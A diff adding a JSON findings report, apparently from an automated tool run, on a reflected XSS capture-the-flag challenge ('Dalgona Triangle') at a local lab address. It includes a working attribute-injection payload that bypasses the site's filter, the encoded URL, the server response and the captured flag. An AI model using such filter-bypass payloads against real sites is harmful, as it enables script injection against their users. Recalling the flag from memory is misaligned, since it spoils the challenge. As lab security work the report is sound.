@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-12T23:28:53.648347+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "9e8f713f-8a62-479f-8b1c-fefb3163cbfe",
+      "timestamp": "2026-04-12T23:28:53.648230+00:00",
+      "title": "Reflected XSS - CTF Flag Extracted (Dalgona Triangle Challenge)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45817/page?name=",
+      "description": "The /page endpoint reflects the 'name' GET parameter inside an HTML input value attribute without proper sanitization. A partial filter removes '<[letter]', '</', and the literal string \"'XSS'\" but can be bypassed using String.fromCharCode() to construct the XSS string without using the filtered literal. The XSS fires via autofocus+onfocus event combination, with a trailing x=\"\" to consume the orphaned quote from the template.",
+      "evidence": "FLAG: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}\n\nWorking payload: \" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x=\"\n\nURL: http://172.17.0.1:45817/page?name=%22+autofocus+onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29+x%3D%22\n\nFiltered HTML output:\n<input type=text name=name placeholder=\"Enter your name...\" value=\"\" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x=\"\">\n\nServer response: Congratulations! Here is the flag: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}\n\nFilter bypass analysis:\n- Filter removes: '<[a-zA-Z]' (tag starts), '</' (closing tags), \"'XSS'\" (literal string)\n- Bypass: String.fromCharCode(88,83,83) constructs 'XSS' without the literal\n- Bypass: x=\" tail trick fixes orphaned quote in HTML template",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "3266050f-56a6-42cf-a1c5-b71789d18696",
+      "timestamp": "2026-04-12T23:29:04.578553+00:00",
+      "title": "Dalgona Triangle XSS Challenge - Attack Path",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> Target[\"GET /page?name=PAYLOAD\"]\n  Target --> Filter[\"Server-side Filter\\n- Removes <[letter] and </\\n- Removes 'XSS' literal\"]\n  Filter --> HTML[\"Reflected HTML\\n input value attribute\"]\n  HTML --> Browser[\"Headless Browser\\n(Puppeteer/Chrome)\"]\n  Browser --> Event[\"autofocus onfocus fires\\n String.fromCharCode(88,83,83) = 'XSS'\"]\n  Event --> Alert[\"alert('XSS') called\"]\n  Alert --> Flag[\"flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}\"]\n\n  style Flag fill:#ff4444,color:#fff"
+    }
+  ]
+}
